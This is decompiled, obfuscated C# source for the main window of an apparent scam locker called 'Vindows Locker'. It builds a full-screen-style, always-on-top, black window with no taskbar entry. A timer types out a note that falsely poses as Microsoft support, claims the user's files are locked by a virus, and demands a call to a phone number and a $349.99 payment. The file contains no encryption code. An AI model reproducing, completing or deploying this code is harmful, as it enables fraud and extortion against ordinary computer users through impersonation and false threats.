using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Vindows.Properties;

namespace Vindows.Engine.Interface;

public class MainForm : Form
{
	private string string_0 = "this not microsoft vindows support\r\nwe have locked your files with the zeus wirus\r\ndo one thing and call level 5 microsoft support technician at 1-844-609-3192\r\n you will files back for a one time charge of $349.99";

	private IContainer icontainer_0;

	private Label MainLabel;

	private PictureBox pictureBox1;

	private Timer timer_0;

	public MainForm()
	{
		InitializeComponent();
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		while (string_0.Length == 0)
		{
			int num = 6104;
			int num2 = num;
			num = 6104;
			switch (num2 == num)
			{
			case false:
			case true:
				continue;
			}
			if (0 == 0)
			{
			}
			if (1 == 0)
			{
			}
			num = 0;
			timer_0.set_Enabled(false);
			return;
		}
		Label mainLabel = MainLabel;
		((Control)mainLabel).set_Text(((Control)mainLabel).get_Text() + string_0[0]);
		string_0 = string_0.Remove(0, 1);
	}

	protected override void Dispose(bool disposing)
	{
		while (true)
		{
			int num = 2;
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 3:
					num = 0;
					num2 = num;
					continue;
				case 2:
					if (true)
					{
					}
					goto default;
				default:
					if (disposing)
					{
						num = 3;
						num2 = num;
						continue;
					}
					goto case 4;
				case 1:
					icontainer_0.Dispose();
					num = 4;
					num2 = num;
					continue;
				case 0:
				{
					num = 32490;
					int num3 = num;
					num = 32490;
					switch (num3 == num)
					{
					case false:
					case true:
						break;
					default:
						num = 0;
						goto case true;
					case true:
						if (false)
						{
						}
						goto IL_00a7;
					}
					break;
				}
				case 4:
					{
						((Form)this).Dispose(disposing);
						return;
					}
					IL_00a7:
					if (icontainer_0 != null)
					{
						num = 1;
						num2 = num;
						continue;
					}
					goto case 4;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Expected O, but got Unknown
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_0092: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_0228: Unknown result type (might be due to invalid IL or missing references)
		//IL_0232: Expected O, but got Unknown
		//IL_0245: Unknown result type (might be due to invalid IL or missing references)
		//IL_024f: Expected O, but got Unknown
		int num = -17673;
		int num2 = num;
		num = -17673;
		switch (num2 == num)
		{
		}
		if (0 == 0)
		{
		}
		num = 0;
		if (1 == 0)
		{
		}
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainForm));
		MainLabel = new Label();
		pictureBox1 = new PictureBox();
		timer_0 = new Timer(icontainer_0);
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)MainLabel).set_Font(new Font("Lucida Console", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)MainLabel).set_ForeColor(Color.Lime);
		((Control)MainLabel).set_Location(new Point(12, 9));
		((Control)MainLabel).set_Name("MainLabel");
		((Control)MainLabel).set_Size(new Size(600, 97));
		((Control)MainLabel).set_TabIndex(0);
		pictureBox1.set_Image((Image)(object)Resources.vindows);
		((Control)pictureBox1).set_Location(new Point(15, 109));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(597, 320));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(1);
		pictureBox1.set_TabStop(false);
		timer_0.set_Enabled(true);
		timer_0.set_Interval(250);
		timer_0.add_Tick((EventHandler)timer_0_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(7f, 11f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(624, 441));
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)MainLabel);
		((Control)this).set_Font(new Font("Lucida Console", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("MainForm");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Vindows Locker");
		((Form)this).set_TopMost(true);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
